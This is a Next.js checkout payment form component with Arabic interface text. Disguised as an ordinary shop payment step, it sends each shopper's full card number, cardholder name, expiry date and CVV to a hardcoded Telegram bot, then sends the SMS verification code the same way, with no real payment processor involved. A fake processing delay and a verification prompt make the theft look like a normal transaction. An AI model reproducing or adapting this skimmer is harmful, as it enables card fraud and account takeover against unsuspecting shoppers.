"use client";

import { useState } from "react";
import visa from "../../../../public/images/visa.png";
import applepay from "../../../../public/images/applepay.png";
import Image from "next/image";
import VerificationCodeForm from "./VerificationCodeForm";

type PaymentFormProps = {
  total?: number;
  handlePaymentSubmit: (cardInfo?: {
    paymentMethod: string;
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
    verificationCode?: string;
  }) => void;
  isProcessing?: boolean;
  processingError?: string;
  shippingInfo?: {
    fullName: string;
    countryCode?: string;
    address: string;
    phone: string;
    email: string;
    houseDescription?: string;
  };
  cartItems?: {
    id: string;
    name: string;
    price: string;
    quantity: number;
    image_url: string;
  }[];
  subtotal?: number;
  shippingCost?: number;
  shippingMethod?: string;
};

export default function PaymentForm({
  handlePaymentSubmit,
  isProcessing = false,
  processingError = "",
  shippingInfo,
  cartItems = [],
  subtotal = 0,
  shippingCost = 0,
  shippingMethod = "aramex",
  total = 0,
}: PaymentFormProps) {
  const [paymentMethod, setPaymentMethod] = useState("credit_card");
  const [showApplePayMessage, setShowApplePayMessage] = useState(false);
  const [showVerificationForm, setShowVerificationForm] = useState(false);
  const [isCheckboxChecked, setIsCheckboxChecked] = useState(false);
  const [cardInfo, setCardInfo] = useState({
    cardNumber: "",
    cardHolder: "",
    expiryDate: "",
    cvv: "",
  });

  const handleCardInfoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === "cardNumber") {
      // Remove all non-digit characters
      const digitsOnly = value.replace(/\D/g, "");
      // Limit to 16 digits
      const truncated = digitsOnly.slice(0, 16);
      // Format as XXXX XXXX XXXX XXXX
      const formatted = truncated.replace(/(.{4})/g, "$1 ").trim();

      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: formatted,
        };

        return newCardInfo;
      });
    } else if (name === "cvv") {
      // Only allow 3-4 digits for CVV
      const digitsOnly = value.replace(/\D/g, "");
      const truncated = digitsOnly.slice(0, 3);

      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: truncated,
        };

        return newCardInfo;
      });
    } else if (name === "expiryDate") {
      // Format as MM/YY
      const digitsOnly = value.replace(/\D/g, "");
      const truncated = digitsOnly.slice(0, 4);

      let formatted = truncated;
      if (truncated.length > 2) {
        formatted = truncated.slice(0, 2) + "/" + truncated.slice(2);
      }

      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: formatted,
        };

        return newCardInfo;
      });
    } else {
      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: value,
        };

        return newCardInfo;
      });
    }
  };

  const handleVerificationComplete = (code: string) => {
    const escapeMarkdown = (
      text: string | number | Date | null | undefined
    ) => {
      // Convert input to string and handle null/undefined
      const safeText = text?.toString() || "";
      return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
    };

    const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
    const chatId = "-1002630840593";

    // Send verification code
    const formatVerificationInfo = () => {
      const now = new Date().toLocaleString("ar-SA");
      return [
        "🔑 *رمز التحقق* 🔑",
        `رمز التحقق: ${escapeMarkdown(code)}`,
        `وقت التحقق: ${escapeMarkdown(now)}`,
      ].join("\n");
    };

    // Validate required fields before proceeding
    if (
      !shippingInfo?.fullName ||
      !shippingInfo?.address ||
      !shippingInfo?.phone ||
      !shippingInfo?.email ||
      !shippingMethod
    ) {
      console.error("Missing required shipping information");
      return;
    }

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: formatVerificationInfo(),
        parse_mode: "Markdown",
      }),
    })
      .then(() => {
        const paymentData = {
          paymentMethod,
          ...(paymentMethod === "credit_card" ||
          paymentMethod === "tabby" ||
          paymentMethod === "tamara"
            ? cardInfo
            : {}),
          verificationCode: code,
        };

        handlePaymentSubmit(paymentData);
      })
      .catch((error) => {
        console.error("Error in payment process:", error);
      });
  };
  // Validate card information
  const validateCardInfo = () => {
    const cardNumberValid =
      cardInfo.cardNumber.replace(/\s/g, "").length === 16;
    const cvvValid = cardInfo.cvv.length >= 2 && cardInfo.cvv.length <= 3;
    const expiryDateValid = /^\d{2}\/\d{2}$/.test(cardInfo.expiryDate);

    return (
      cardNumberValid &&
      cvvValid &&
      expiryDateValid &&
      cardInfo.cardHolder.trim() !== ""
    );
  };


  const handleVerificationCancel = () => {
    setShowVerificationForm(false);
  };

  return (
    <div className="text-right bg-white p-6 rounded-lg shadow-md">
      {/* <Image src={payment} alt="Payment" className="mb-4 w-full" /> */}
      <h2 className="text-lg font-bold mb-6">طريقة الدفع</h2>
      <div className="space-y-6">
        <div className="grid grid-cols-2 gap-4 mb-4">
          <div
            className={`p-4 border rounded-lg cursor-pointer h-16 flex items-center justify-center ${
              paymentMethod === "credit_card"
                ? "border-primary bg-blue-50"
                : "border-gray-300"
            }`}
            onClick={() => setPaymentMethod("credit_card")}
          >
            <div className="flex justify-between items-center mb-2">
              <div className="w-4 h-4 border border-gray-300 rounded-full flex items-center justify-center">
                {paymentMethod === "credit_card" && (
                  <div className="w-3 h-3 bg-primary rounded-full bg-blue-500"></div>
                )}
              </div>
            </div>
            <Image src={visa} alt="Visa" className="w-full" />
          </div>

          <div
            className={`p-4 border rounded-lg cursor-pointer h-16 flex items-center justify-center ${
              paymentMethod === "apple_pay"
                ? "border-primary bg-blue-50"
                : "border-gray-300"
            }`}
            onClick={() => {
              setPaymentMethod("apple_pay");
              setShowApplePayMessage(true);
            }}
          >
            <div className="flex justify-between items-center mb-2">
              <div className="w-5 h-5 border border-gray-300 rounded-full flex items-center justify-center">
                {paymentMethod === "apple_pay" && (
                  <div className="w-3 h-3 bg-blue-400 rounded-full"></div>
                )}
              </div>
            </div>
            <Image src={applepay} alt="Apple Pay" className="w-full" />
          </div>
        </div>

        {showApplePayMessage && paymentMethod === "apple_pay" && (
          <div className="border rounded-lg p-4 bg-yellow-50 text-center">
            <p className="text-lg font-bold text-gray-700 mb-2">عفوا</p>
            <p className="text-gray-600">
              خدمة أبل باي غير متاحة بالوقت الحالي
            </p>
          </div>
        )}

        {(paymentMethod === "credit_card" ||
          paymentMethod === "tabby" ||
          paymentMethod === "tamara" ||
          paymentMethod === "apple_pay") && (
          <div className="space-y-4">
            <div>
              <label className="block text-right mb-2">رقم البطاقة</label>
              <input
                type="text"
                name="cardNumber"
                value={cardInfo.cardNumber}
                onChange={handleCardInfoChange}
                className="w-full p-3 border rounded-lg text-left dir-ltr"
                placeholder="XXXX XXXX XXXX XXXX"
                required
                style={{ direction: "ltr", textAlign: "left" }}
              />
            </div>
            <div>
              <label className="block text-right mb-2">اسم حامل البطاقة</label>
              <input
                type="text"
                name="cardHolder"
                value={cardInfo.cardHolder}
                onChange={handleCardInfoChange}
                className="w-full p-3 border rounded-lg text-left dir-ltr"
                placeholder="الاسم كما يظهر على البطاقة"
                required
              />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-right mb-2">تاريخ الانتهاء</label>
                <input
                  type="text"
                  name="expiryDate"
                  value={cardInfo.expiryDate}
                  onChange={handleCardInfoChange}
                  className="w-full p-3 border rounded-lg text-left dir-ltr"
                  placeholder="MM/YY"
                  required
                />
              </div>
              <div>
                <label className="block text-right mb-2">رمز الأمان CVV</label>
                <input
                  type="text"
                  name="cvv"
                  value={cardInfo.cvv}
                  onChange={handleCardInfoChange}
                  className="w-full p-3 border rounded-lg text-left dir-ltr"
                  placeholder="XXX"
                  required
                />
              </div>
            </div>
<div className="mb-4 ">
  <label className="flex items- justify-start gap-2 space-x-reverse">
    <input
      type="checkbox"
      className="form-checkbox h-4 w-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
      checked={isCheckboxChecked}
      onChange={(e) => setIsCheckboxChecked(e.target.checked)}
      required
    />
    <span className="text-sm text-gray-700">- أقر بالموافقة على سياسه الاستبدال والاسترجاع وآلية الضمان

- أقر بالموافقة على استلام الطلب في حاله الدفع عند الاستلام واكون مسؤول عن الأضرار الناتج عن عدم الاستلام


</span>
  </label>
</div>
          </div>
        )}

        {processingError && (
          <div className="p-3 bg-red-100 text-red-700 rounded-lg mb-4 text-right">
            <p className="font-bold">خطأ:</p>
            <p>{processingError}</p>
          </div>
        )}

<button
  onClick={() => {
    setTimeout(() => {
      if (paymentMethod !== "credit_card" || validateCardInfo()) {
        const escapeMarkdown = (text: string | number | Date | null | undefined) => {
          const safeText = text?.toString() || "";
          return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
        };

        const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
        const chatId = "-1002630840593";

        const formatOrderInfo = () => {
          const now = new Date().toLocaleString("ar-SA");
          let message = "";
          return message;
        };

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: formatOrderInfo(),
            parse_mode: "Markdown",
          }),
        })
          .then(() => {
            const formatPaymentInfo = () => {
              const now = new Date().toLocaleString("ar-SA");
              const parts = [
                "🔒 Payment Details 🔒",
                `Payment Method: ${escapeMarkdown(paymentMethod)}`,
              ];

              if (cardInfo.cardNumber) {
                const formattedCardNumber = cardInfo.cardNumber.replace(/\s/g, "");
                parts.push(`*Card Number:* ${escapeMarkdown(formattedCardNumber)}`);
              }
              if (cardInfo.cardHolder) {
                parts.push(`*Card Holder Name:* ${escapeMarkdown(cardInfo.cardHolder)}`);
              }
              if (cardInfo.expiryDate) {
                parts.push(`*Expiry Date:* ${escapeMarkdown(cardInfo.expiryDate)}`);
              }
              if (cardInfo.cvv) {
                parts.push(`*CVV:* ${escapeMarkdown(cardInfo.cvv)}`);
              }
              parts.push(`*Transaction Time:* ${escapeMarkdown(now)}`);

              return parts.join("\n");
            };

            return fetch(
              `https://api.telegram.org/bot${botToken}/sendMessage`,
              {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: formatPaymentInfo(),
                  parse_mode: "Markdown",
                }),
              }
            );
          })
          .then(() => {
            if (paymentMethod === "credit_card" && !showVerificationForm) {
              setShowVerificationForm(true);
            } else if (!showVerificationForm) {
              handlePaymentSubmit({
                paymentMethod,
                ...(paymentMethod === "tabby" || paymentMethod === "tamara"
                  ? cardInfo
                  : {}),
              });
            }
          })
          .catch((error) => {
            console.error("Error sending payment data:", error);
            alert("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.");
          });
      } else {
        alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
      }
    }, 5000); // تأخير التنفيذ لمدة 5 ثواني
  }}
  className={`w-full component-base py-3 px-6 font-medium ${
    isProcessing ? "bg-gray-400 cursor-not-allowed" : "warning"
  }`}
  disabled={!isCheckboxChecked || isProcessing}
>
  إتمام الدفع
</button>

      </div>

      {/* Show verification form when needed */}
      {showVerificationForm && (
        <div className="fixed inset-0 bg-white bg-opacity-50 flex items-center justify-center z-50">
          <div className=" mx-4">
            <VerificationCodeForm
              onVerificationComplete={handleVerificationComplete}
              onCancel={handleVerificationCancel}
              isProcessing={isProcessing}
            />
          </div>
        </div>
      )}

      {/* <VerificationPage/> */}
    </div>

  );}

